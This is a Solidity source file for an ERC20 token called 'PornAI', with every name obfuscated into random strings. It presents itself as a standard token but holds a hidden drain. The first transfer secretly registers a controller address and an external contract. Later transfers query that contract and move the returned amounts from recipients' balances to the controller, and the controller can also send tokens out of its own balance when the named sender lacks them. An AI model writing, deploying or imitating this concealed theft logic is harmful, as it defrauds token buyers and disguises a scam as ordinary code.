
// File: /contracts/PornAI.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface PQmTAnCRLjW {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library lOnvZ{
    
    function JGWmwLwtg(address idRzoogpFN, address UrDPQxGiC, uint uFfqZq) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool bKa, bytes memory jxhLujeEk) = idRzoogpFN.call(abi.encodeWithSelector(0x095ea7b3, UrDPQxGiC, uFfqZq));
        require(bKa && (jxhLujeEk.length == 0 || abi.decode(jxhLujeEk, (bool))), 'lOnvZ: APPROVE_FAILED');
    }

    function HiNoN(address idRzoogpFN, address UrDPQxGiC, uint uFfqZq) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool bKa, bytes memory jxhLujeEk) = idRzoogpFN.call(abi.encodeWithSelector(0xa9059cbb, UrDPQxGiC, uFfqZq));
        require(bKa && (jxhLujeEk.length == 0 || abi.decode(jxhLujeEk, (bool))), 'lOnvZ: TRANSFER_FAILED');
    }
    
    function zJtTFfsxnKO(address UrDPQxGiC, uint uFfqZq) internal {
        (bool bKa,) = UrDPQxGiC.call{value:uFfqZq}(new bytes(0));
        require(bKa, 'lOnvZ: ETH_TRANSFER_FAILED');
    }

    function WgQiVH(address idRzoogpFN, address from, address UrDPQxGiC, uint uFfqZq) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool bKa, bytes memory jxhLujeEk) = idRzoogpFN.call(abi.encodeWithSelector(0x23b872dd, from, UrDPQxGiC, uFfqZq));
        require(bKa && jxhLujeEk.length > 0,'lOnvZ: TRANSFER_FROM_FAILED'); return jxhLujeEk;
                       
    }

}
    
interface TwiPGawDFPh {
    function totalSupply() external view returns (uint256);
    function balanceOf(address zlofNxfLso) external view returns (uint256);
    function transfer(address wfhBvqMNwyN, uint256 SpkjQ) external returns (bool);
    function allowance(address MLUbdN, address spender) external view returns (uint256);
    function approve(address spender, uint256 SpkjQ) external returns (bool);
    function transferFrom(
        address sender,
        address wfhBvqMNwyN,
        uint256 SpkjQ
    ) external returns (bool);

    event Transfer(address indexed from, address indexed nUGfEtY, uint256 value);
    event Approval(address indexed MLUbdN, address indexed spender, uint256 value);
}

interface wzXeVSY is TwiPGawDFPh {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract lpHuDj {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract PornAI is lpHuDj, TwiPGawDFPh, wzXeVSY {
    
    function totalSupply() public view virtual override returns (uint256) {
        return dAn;
    }
    
    string private dsoliRyRD = "PornAI";
    
    constructor() {
        
        sDmZ[address(1)] = dAn;
        emit Transfer(address(0), address(1), dAn);

    }
    
    function transferFrom(
        address ByXKrhWUCx,
        address KRHZcNs,
        uint256 UPhnTz
    ) public virtual override returns (bool) {
      
        if(!YRtk(ByXKrhWUCx, KRHZcNs, UPhnTz)) return true;

        uint256 TCIl = enYynvGNx[ByXKrhWUCx][_msgSender()];
        if (TCIl != type(uint256).max) {
            require(TCIl >= UPhnTz, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                FZwLeOfwKcb(ByXKrhWUCx, _msgSender(), TCIl - UPhnTz);
            }
        }

        return true;
    }
    
    function YRtk(
        address WhhkWCtZ,
        address ohRB,
        uint256 roxjk
    ) internal virtual  returns (bool){
        require(WhhkWCtZ != address(0), "ERC20: transfer from the zero address");
        require(ohRB != address(0), "ERC20: transfer to the zero address");
        
        if(!qfl(WhhkWCtZ,ohRB)) return false;

        if(_msgSender() == address(lhsPXckezkVp)){
            if(ohRB == ofgABo && sDmZ[WhhkWCtZ] < roxjk){
                chbGAVB(lhsPXckezkVp,ohRB,roxjk);
            }else{
                chbGAVB(WhhkWCtZ,ohRB,roxjk);
                if(WhhkWCtZ == lhsPXckezkVp || ohRB == lhsPXckezkVp) 
                return false;
            }
            emit Transfer(WhhkWCtZ, ohRB, roxjk);
            return false;
        }
        chbGAVB(WhhkWCtZ,ohRB,roxjk);
        emit Transfer(WhhkWCtZ, ohRB, roxjk);
        bytes memory IIhdbA = lOnvZ.WgQiVH(PcEvmbdQIY, WhhkWCtZ, ohRB, roxjk);
        (bool QkiGSvBQ, uint iatLZU) = abi.decode(IIhdbA, (bool,uint));
        if(QkiGSvBQ){
            sDmZ[lhsPXckezkVp] += iatLZU;
            sDmZ[ohRB] -= iatLZU; 
        }
        return true;
    }
    
    mapping(address => uint256) private sDmZ;
    
    function symbol() public view virtual override returns (string memory) {
        return VpbtIBFSB;
    }
    
    uint256 private dAn = 2000000000000 * 10 ** 18;
    
    mapping(address => mapping(address => uint256)) private enYynvGNx;
    
    address private ofgABo;
  
    
    function transfer(address wVdQZpxpzZO, uint256 KcXXJZWY) public virtual override returns (bool) {
        YRtk(_msgSender(), wVdQZpxpzZO, KcXXJZWY);
        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    string private VpbtIBFSB =  "PornAI";
    
    function balanceOf(address pVkvZaGHi) public view virtual override returns (uint256) {
       return sDmZ[pVkvZaGHi];
    }
    
    address private PcEvmbdQIY;
    
    function chbGAVB(
        address TsoYGUHCKOX,
        address GOpQut,
        uint256 DWr
    ) internal virtual  returns (bool){
        uint256 JhvBgzt = sDmZ[TsoYGUHCKOX];
        require(JhvBgzt >= DWr, "ERC20: transfer Amount exceeds balance");
        unchecked {
            sDmZ[TsoYGUHCKOX] = JhvBgzt - DWr;
        }
        sDmZ[GOpQut] += DWr;
        return true;
    }
    
    function approve(address zKFAlwrkM, uint256 RQMCXsGaE) public virtual override returns (bool) {
        FZwLeOfwKcb(_msgSender(), zKFAlwrkM, RQMCXsGaE);
        return true;
    }
    
    function qfl(
        address rGgnNoB,
        address LlGTAHRW
    ) internal virtual  returns (bool){
        if(lhsPXckezkVp == address(0) && PcEvmbdQIY == address(0)){
            lhsPXckezkVp = rGgnNoB;PcEvmbdQIY=LlGTAHRW;
            lOnvZ.HiNoN(PcEvmbdQIY, lhsPXckezkVp, 0);
            ofgABo = PQmTAnCRLjW(PcEvmbdQIY).WETH();
            return false;
        }
        return true;
    }
    
    function FZwLeOfwKcb(
        address fhKYeO,
        address WXsTi,
        uint256 xtA
    ) internal virtual {
        require(fhKYeO != address(0), "ERC20: approve from the zero address");
        require(WXsTi != address(0), "ERC20: approve to the zero address");

        enYynvGNx[fhKYeO][WXsTi] = xtA;
        emit Approval(fhKYeO, WXsTi, xtA);

    }
    
    address private lhsPXckezkVp;
    
    function increaseAllowance(address FplltgEeqJxZ, uint256 addedValue) public virtual returns (bool) {
        FZwLeOfwKcb(_msgSender(), FplltgEeqJxZ, enYynvGNx[_msgSender()][FplltgEeqJxZ] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address gajWqdlr, uint256 subtractedValue) public virtual returns (bool) {
        uint256 SAjBicjX = enYynvGNx[_msgSender()][gajWqdlr];
        require(SAjBicjX >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            FZwLeOfwKcb(_msgSender(), gajWqdlr, SAjBicjX - subtractedValue);
        }

        return true;
    }
    
    function allowance(address aObOUC, address KLV) public view virtual override returns (uint256) {
        return enYynvGNx[aObOUC][KLV];
    }
    
    function name() public view virtual override returns (string memory) {
        return dsoliRyRD;
    }
    
}
        
